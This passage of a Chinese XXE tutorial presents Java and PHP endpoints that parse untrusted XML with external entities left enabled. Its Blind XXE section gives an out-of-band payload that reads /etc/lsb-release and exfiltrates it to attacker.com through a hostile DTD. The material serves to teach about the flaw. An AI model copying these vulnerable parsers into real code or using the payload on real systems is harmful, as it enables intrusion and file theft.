+            <span class="n">String</span> <span class="n">password</span> <span class="o">=</span> <span class="n">getValueByTagName3</span><span class="o">(</span><span class="n">document</span><span class="o">,</span><span class="s">"password"</span><span class="o">);</span>
+
+            <span class="k">if</span><span class="o">(</span><span class="n">username</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">USERNAME</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">password</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">PASSWORD</span><span class="o">)){</span>
+                <span class="n">result</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span><span class="o">,</span><span class="mi">1</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
+            <span class="o">}</span><span class="k">else</span><span class="o">{</span>
+                <span class="n">result</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
+            <span class="o">}</span>
+
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">JDOMException</span>  <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+        <span class="o">}</span> 
+        <span class="n">response</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="s">"text/xml;charset=UTF-8"</span><span class="o">);</span>
+        <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">append</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
+    <span class="o">}</span>
+</pre></div>
+<p>4)SAX Read XML</p>
+<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">doPost</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>      
+        <span class="c1">//https://blog.csdn.net/u011024652/article/details/51516220</span>
+        <span class="n">String</span> <span class="n">result</span><span class="o">=</span><span class="s">""</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//SAX Read XML</span>
+            <span class="n">SAXParserFactory</span> <span class="n">factory</span>  <span class="o">=</span> <span class="n">SAXParserFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span> 
+            <span class="n">SAXParser</span> <span class="n">saxparser</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">newSAXParser</span><span class="o">();</span>  
+            <span class="n">SAXHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SAXHandler</span><span class="o">();</span>  
+            <span class="n">saxparser</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">(),</span> <span class="n">handler</span><span class="o">);</span>
+            <span class="c1">//为简单，没有提取子元素中的数据，只要调用parse()解析xml就已经触发xxe漏洞了</span>
+            <span class="c1">//没有回显  blind xxe</span>
+             <span class="n">result</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="mi">1</span><span class="o">);</span>
+
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ParserConfigurationException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span><span class="o">,</span><span class="mi">3</span><span class="o">,</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">SAXException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span><span class="o">,</span><span class="mi">3</span><span class="o">,</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+        <span class="o">}</span>
+        <span class="n">response</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="s">"text/xml;charset=UTF-8"</span><span class="o">);</span>
+        <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">append</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
+    <span class="o">}</span>
+</pre></div>
+<p>其他：</p>
+<p>0x1:</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">XXE</span> <span class="o">{</span>
+
+    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/xmlReader"</span><span class="o">,</span> <span class="n">method</span> <span class="o">=</span> <span class="n">RequestMethod</span><span class="o">.</span><span class="na">POST</span><span class="o">)</span>
+    <span class="nd">@ResponseBody</span>
+    <span class="kd">public</span>  <span class="n">String</span> <span class="nf">xxe_xmlReader</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">xml_con</span> <span class="o">=</span> <span class="n">getBody</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">xml_con</span><span class="o">);</span>
+            <span class="n">XMLReader</span> <span class="n">xmlReader</span> <span class="o">=</span> <span class="n">XMLReaderFactory</span><span class="o">.</span><span class="na">createXMLReader</span><span class="o">();</span>
+            <span class="n">xmlReader</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">(</span><span class="k">new</span> <span class="n">StringReader</span><span class="o">(</span><span class="n">xml_con</span><span class="o">))</span> <span class="o">);</span>  <span class="c1">// parse xml</span>
+            <span class="k">return</span> <span class="s">"ok"</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+            <span class="k">return</span> <span class="s">"except"</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p>0x2:</p>
+<div class="highlight"><pre><span></span><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/SAXBuilder"</span><span class="o">,</span> <span class="n">method</span> <span class="o">=</span> <span class="n">RequestMethod</span><span class="o">.</span><span class="na">POST</span><span class="o">)</span>
+    <span class="nd">@ResponseBody</span>
+    <span class="kd">public</span>  <span class="n">String</span> <span class="nf">xxe_SAXBuilder</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">xml_con</span> <span class="o">=</span> <span class="n">getBody</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">xml_con</span><span class="o">);</span>
+
+            <span class="n">SAXBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SAXBuilder</span><span class="o">();</span>
+            <span class="n">org</span><span class="o">.</span><span class="na">jdom2</span><span class="o">.</span><span class="na">Document</span> <span class="n">document</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">build</span><span class="o">(</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">(</span><span class="k">new</span> <span class="n">StringReader</span><span class="o">(</span><span class="n">xml_con</span><span class="o">))</span> <span class="o">);</span>  <span class="c1">// cause xxe</span>
+            <span class="k">return</span> <span class="s">"ok"</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+            <span class="k">return</span> <span class="s">"except"</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p>0x3:</p>
+<div class="highlight"><pre><span></span><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/SAXReader"</span><span class="o">,</span> <span class="n">method</span> <span class="o">=</span> <span class="n">RequestMethod</span><span class="o">.</span><span class="na">POST</span><span class="o">)</span>
+    <span class="nd">@ResponseBody</span>
+    <span class="kd">public</span>  <span class="n">String</span> <span class="nf">xxe_SAXReader</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">xml_con</span> <span class="o">=</span> <span class="n">getBody</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">xml_con</span><span class="o">);</span>
+
+            <span class="n">SAXReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SAXReader</span><span class="o">();</span>
+            <span class="n">org</span><span class="o">.</span><span class="na">dom4j</span><span class="o">.</span><span class="na">Document</span> <span class="n">document</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="na">read</span><span class="o">(</span>  <span class="k">new</span> <span class="n">InputSource</span><span class="o">(</span><span class="k">new</span> <span class="n">StringReader</span><span class="o">(</span><span class="n">xml_con</span><span class="o">))</span> <span class="o">);</span> <span class="c1">// cause xxe</span>
+
+            <span class="k">return</span> <span class="s">"ok"</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+            <span class="k">return</span> <span class="s">"except"</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p>0x4:</p>
+<div class="highlight"><pre><span></span><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/SAXParser"</span><span class="o">,</span> <span class="n">method</span> <span class="o">=</span> <span class="n">RequestMethod</span><span class="o">.</span><span class="na">POST</span><span class="o">)</span>
+    <span class="nd">@ResponseBody</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">xxe_SAXParser</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">xml_con</span> <span class="o">=</span> <span class="n">getBody</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">xml_con</span><span class="o">);</span>
+
+            <span class="n">SAXParserFactory</span> <span class="n">spf</span> <span class="o">=</span> <span class="n">SAXParserFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="n">SAXParser</span> <span class="n">parser</span> <span class="o">=</span> <span class="n">spf</span><span class="o">.</span><span class="na">newSAXParser</span><span class="o">();</span>
+            <span class="n">parser</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="k">new</span> <span class="n">InputSource</span><span class="o">(</span><span class="k">new</span> <span class="n">StringReader</span><span class="o">(</span><span class="n">xml_con</span><span class="o">)),</span> <span class="k">new</span> <span class="n">DefaultHandler</span><span class="o">());</span>  <span class="c1">// parse xml</span>
+
+            <span class="k">return</span> <span class="s">"test"</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+            <span class="k">return</span> <span class="s">"except"</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p>0x5:</p>
+<div class="highlight"><pre><span></span><span class="c1">// 有回显的XXE</span>
+    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/DocumentBuilder_return"</span><span class="o">,</span> <span class="n">method</span> <span class="o">=</span> <span class="n">RequestMethod</span><span class="o">.</span><span class="na">POST</span><span class="o">)</span>
+    <span class="nd">@ResponseBody</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">xxeDocumentBuilderReturn</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">xml_con</span> <span class="o">=</span> <span class="n">getBody</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">xml_con</span><span class="o">);</span>
+
+            <span class="n">DocumentBuilderFactory</span> <span class="n">dbf</span> <span class="o">=</span> <span class="n">DocumentBuilderFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="n">DocumentBuilder</span> <span class="n">db</span> <span class="o">=</span> <span class="n">dbf</span><span class="o">.</span><span class="na">newDocumentBuilder</span><span class="o">();</span>
+            <span class="n">StringReader</span> <span class="n">sr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringReader</span><span class="o">(</span><span class="n">xml_con</span><span class="o">);</span>
+            <span class="n">InputSource</span> <span class="n">is</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">(</span><span class="n">sr</span><span class="o">);</span>
+            <span class="n">Document</span> <span class="n">document</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">is</span><span class="o">);</span>  <span class="c1">// parse xml</span>
+
+            <span class="c1">// 遍历xml节点name和value</span>
+            <span class="n">StringBuffer</span> <span class="n">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">();</span>
+            <span class="n">NodeList</span> <span class="n">rootNodeList</span> <span class="o">=</span> <span class="n">document</span><span class="o">.</span><span class="na">getChildNodes</span><span class="o">();</span>
+            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">rootNodeList</span><span class="o">.</span><span class="na">getLength</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+                <span class="n">Node</span> <span class="n">rootNode</span> <span class="o">=</span> <span class="n">rootNodeList</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
+                <span class="n">NodeList</span> <span class="n">child</span> <span class="o">=</span> <span class="n">rootNode</span><span class="o">.</span><span class="na">getChildNodes</span><span class="o">();</span>
+                <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">child</span><span class="o">.</span><span class="na">getLength</span><span class="o">();</span> <span class="n">j</span><span class="o">++)</span> <span class="o">{</span>
+                    <span class="n">Node</span> <span class="n">node</span> <span class="o">=</span> <span class="n">child</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="n">j</span><span class="o">);</span>
+                    <span class="n">buf</span><span class="o">.</span><span class="na">append</span><span class="o">(</span> <span class="n">node</span><span class="o">.</span><span class="na">getNodeName</span><span class="o">()</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">node</span><span class="o">.</span><span class="na">getTextContent</span><span class="o">()</span> <span class="o">+</span> <span class="s">"\n"</span> <span class="o">);</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+            <span class="n">sr</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">buf</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+            <span class="k">return</span> <span class="n">buf</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+            <span class="k">return</span> <span class="s">"except"</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+
+    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/DocumentBuilder"</span><span class="o">,</span> <span class="n">method</span> <span class="o">=</span> <span class="n">RequestMethod</span><span class="o">.</span><span class="na">POST</span><span class="o">)</span>
+    <span class="nd">@ResponseBody</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">DocumentBuilder</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">xml_con</span> <span class="o">=</span> <span class="n">getBody</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">xml_con</span><span class="o">);</span>
+
+            <span class="n">DocumentBuilderFactory</span> <span class="n">dbf</span> <span class="o">=</span> <span class="n">DocumentBuilderFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="n">DocumentBuilder</span> <span class="n">db</span> <span class="o">=</span> <span class="n">dbf</span><span class="o">.</span><span class="na">newDocumentBuilder</span><span class="o">();</span>
+            <span class="n">StringReader</span> <span class="n">sr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringReader</span><span class="o">(</span><span class="n">xml_con</span><span class="o">);</span>
+            <span class="n">InputSource</span> <span class="n">is</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">(</span><span class="n">sr</span><span class="o">);</span>
+            <span class="n">Document</span> <span class="n">document</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">is</span><span class="o">);</span>  <span class="c1">// parse xml</span>
+
+            <span class="c1">// 遍历xml节点name和value</span>
+            <span class="n">StringBuffer</span> <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">();</span>
+            <span class="n">NodeList</span> <span class="n">rootNodeList</span> <span class="o">=</span> <span class="n">document</span><span class="o">.</span><span class="na">getChildNodes</span><span class="o">();</span>
+            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">rootNodeList</span><span class="o">.</span><span class="na">getLength</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+                <span class="n">Node</span> <span class="n">rootNode</span> <span class="o">=</span> <span class="n">rootNodeList</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
+                <span class="n">NodeList</span> <span class="n">child</span> <span class="o">=</span> <span class="n">rootNode</span><span class="o">.</span><span class="na">getChildNodes</span><span class="o">();</span>
+                <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">child</span><span class="o">.</span><span class="na">getLength</span><span class="o">();</span> <span class="n">j</span><span class="o">++)</span> <span class="o">{</span>
+                    <span class="n">Node</span> <span class="n">node</span> <span class="o">=</span> <span class="n">child</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="n">j</span><span class="o">);</span>
+                    <span class="c1">// 正常解析XML，需要判断是否是ELEMENT_NODE类型。否则会出现多余的的节点。</span>
+                    <span class="k">if</span><span class="o">(</span><span class="n">child</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="n">j</span><span class="o">).</span><span class="na">getNodeType</span><span class="o">()</span> <span class="o">==</span> <span class="n">Node</span><span class="o">.</span><span class="na">ELEMENT_NODE</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="n">result</span><span class="o">.</span><span class="na">append</span><span class="o">(</span> <span class="n">node</span><span class="o">.</span><span class="na">getNodeName</span><span class="o">()</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">node</span><span class="o">.</span><span class="na">getFirstChild</span><span class="o">().</span><span class="na">getNodeValue</span><span class="o">()</span> <span class="o">+</span> <span class="s">"\n"</span> <span class="o">);</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+            <span class="n">sr</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">result</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+            <span class="k">return</span> <span class="n">result</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+            <span class="k">return</span> <span class="s">"except"</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p><strong>PHP</strong></p>
+<p>如：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">libxml_disable_entity_loader</span><span class="p">(</span><span class="k">false</span><span class="p">);</span><span class="c1">//这个函数原本是禁止加载外部实体,false就是允许</span>
+<span class="nv">$user1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'user1'</span><span class="p">];</span>
+<span class="nv">$xmlfile</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'php://input'</span><span class="p">);</span> <span class="c1">//接收xml数据</span>
+<span class="nv">$aa</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'&lt;!ENTITY'</span><span class="p">,</span><span class="s1">'**'</span><span class="p">,</span><span class="nv">$xmlfile</span><span class="p">);</span>
+<span class="nv">$dom</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMDocument</span><span class="p">();</span>
+<span class="nv">$dom</span><span class="o">-&gt;</span><span class="na">loadXML</span><span class="p">(</span><span class="nv">$aa</span><span class="p">,</span> <span class="nx">LIBXML_NOENT</span> <span class="o">|</span> <span class="nx">LIBXML_DTDLOAD</span><span class="p">);</span>
+<span class="nv">$creds</span> <span class="o">=</span> <span class="nb">simplexml_import_dom</span><span class="p">(</span><span class="nv">$dom</span><span class="p">);</span>
+<span class="nv">$user</span> <span class="o">=</span> <span class="nv">$creds</span><span class="o">-&gt;</span><span class="na">user</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">&lt;!DOCTYPE html&gt;</span>
+<span class="x">&lt;head&gt;</span>
+<span class="x">&lt;title&gt;08067&lt;/title&gt;</span>
+<span class="x">&lt;meta name="description" content="slick Login"&gt;</span>
+<span class="x">&lt;meta name="author" content="MRYE+"&gt;</span>
+<span class="x">&lt;link rel="stylesheet" type="text/css" href="./xxe/style.css" /&gt;</span>
+<span class="x">&lt;style type="text/css"&gt;</span>
+<span class="x">textarea{ resize:none; width:400px; height:200px;margin:10px auto;}</span>
+<span class="x">&lt;/style&gt;</span>
+<span class="x">&lt;script type="text/javascript" src="./xxe/jquery-latest.min.js"&gt;&lt;/script&gt;</span>
+<span class="x">&lt;script type="text/javascript" src="./xxe/placeholder.js"&gt;&lt;/script&gt;</span>
+<span class="x">&lt;/head&gt;</span>
+<span class="x">&lt;body&gt;</span>
+<span class="x">&lt;form id="slick-login" action="./index.php" method="post" &gt;</span>
+<span class="x">&lt;label for="user"&gt;user&lt;/label&gt;</span>
+<span class="x">&lt;input type="text" name="user1" class="placeholder" placeholder="user ?"&gt;</span>
+<span class="x">&lt;input type="submit" value="search"&gt;</span>
+<span class="x">&lt;textarea  name="comment" form="usrform" class="placeholder" placeholder="......"&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">"</span><span class="si">$user</span><span class="s2">"</span><span class="p">;</span><span class="k">echo</span> <span class="s2">"</span><span class="si">$user1</span><span class="s2">"</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">&lt;/textarea&gt;&lt;!-- 这里的user1接收了就打印&gt;</span>
+<span class="x">&lt;user 参数才是xml的回显--&gt;</span>
+<span class="x">&lt;/form&gt;</span>
+<span class="x">&lt;/body&gt;</span>
+<span class="x">&lt;/html&gt;</span>
+</pre></div>
+<p>注：该段代码取自某ctf</p>
+<h2 data-content="1" id="d5c99b2d4ec99e47cb9276b61228a47c">6.Blind XXE</h2>
+<h3 data-content="1" id="61de861730846750e8ee0cb87536ccf1">6.1Blind XXE与OOB-XXE</h3>
+<p>一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象（<strong>带内</strong> <a href="https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/" target="_blank">XML外部实体（XXE</a>），即攻击者可以发送带有XXE有效负载的请求并从包含某些数据的Web应用程序获取响应），无回显的情况又称为blind xxe，可以使用外带数据通道提取数据即带外XML外部实体（OOB-XXE）。</p>
+<p>以下是攻击者如何利用参数实体使用带外（OOB）技术窃取数据的示例。</p>
+<p>request:</p>
+<pre><code>POST http://example.com/xml HTTP/1.1
+
+&lt;!DOCTYPE data [
+  &lt;!ENTITY % file SYSTEM
+  "file:///etc/lsb-release"&gt;
+  &lt;!ENTITY % dtd SYSTEM
+  "http://attacker.com/evil.dtd"&gt;
+  %dtd;
+]&gt;
+&lt;data&gt;&amp;send;&lt;/data&gt;</code></pre>
+<p>攻击者DTD</p>
+<pre><code>&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://attacker.com/?collect=%file;'&gt;"&gt;
+%all;</code></pre>
+<p>XML解析器将首先处理<code>%file</code>加载文件的参数实体<code>/etc/lsb-release</code>。接下来，XML解析器将在<strong><a href="http://attacker.com/evil.dtd" target="_blank">http://attacker.com/evil.dtd</a></strong>向攻击者的DTD发出请求。</p>
+<p>一旦处理了攻击者的DTD，<code>all%</code>参数实体将创建一个名为<strong>＆send</strong>的<strong>通用</strong>实体<strong>;</strong> ，其中包含一个包含文件内容的URL（例如<a href="http://attacker.com/?collect=DISTRIB_ID=Ubuntu" target="_blank">http://attacker.com/?collect=DISTRIB_ID=Ubuntu</a> ...）。最后，一旦URL构造的<code>&amp;send</code>; 实体由解析器处理，解析器向攻击者的服务器发出请求。然后，攻击者可以在其结尾处记录请求，并从记录的请求中重建文件的内容。</p>
+<p>知道何为Blind XXE后，这里再分析一下原理：</p>
+<p><strong>Blind XXE原理</strong></p>
+<p>带外数据通道的建立是使用嵌套形式，利用外部实体中的URL发出访问，从而跟攻击者的服务器发生联系。</p>
+<p>直接在内部实体定义中引用另一个实体的方法如下，但是这种方法行不通。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root [</span>
+<span class="cp">&lt;!ENTITY % param1 "file:///c:/1.txt"&gt;</span>
+<span class="cp">&lt;!ENTITY % param2 "http://127.0.0.1/?%param1"&gt;</span>
+%param2;
+]&gt;
+</pre></div>
+<p>于是考虑内部实体嵌套的形式：</p>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE root [
